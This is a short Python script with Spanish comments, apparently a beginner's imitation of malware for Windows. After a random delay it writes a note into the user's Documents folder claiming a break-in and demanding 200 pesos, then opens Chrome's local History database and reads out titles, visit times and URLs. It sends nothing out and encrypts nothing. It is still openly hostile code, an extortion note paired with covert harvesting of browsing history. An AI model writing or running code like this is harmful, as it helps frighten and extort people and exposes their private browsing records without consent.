import os
import sqlite3 #Conexion a una base de datos
from time import sleep
from random import randrange

HACKER_FILE_NAME = "PARA TI.txt"


def delay_action():
    # Esperaremo entre 1 y 6 horas
    n_hours = randrange(1, 3)
    n_minutes = randrange(1, 60)
    print("Durmiendo {} horas con {} minutos.".format(n_hours, n_minutes))
    sleep(n_hours)
    # sleep(n_hours * n_minutes * 60)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "\\Documents\\" + HACKER_FILE_NAME, "w")
    hacker_file.write("Hola soy un hacker y me he colado en tu sistema, deposita 200 pesos para que no te haga nada")
    return hacker_file


def get_chrome_history(user_path):
    try:
        history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
        connection = sqlite3.connect(history_path)
        cursor = connection.cursor()
        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
        urls = cursor.fetchall()
        print(urls)
        connection.close()
        return urls
    except sqlite3.OperationalError:
        return None


def main():
    # Esperamos entre 1 y 3 horas
    delay_action()
    # Calculamos la ruta del usuario de Windows
    user_path = "C:\\Users\\" + os.getlogin()
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    # Recogemos su historial de google chrome
    chrome_history = get_chrome_history(user_path)




if __name__ == "__main__":
    main()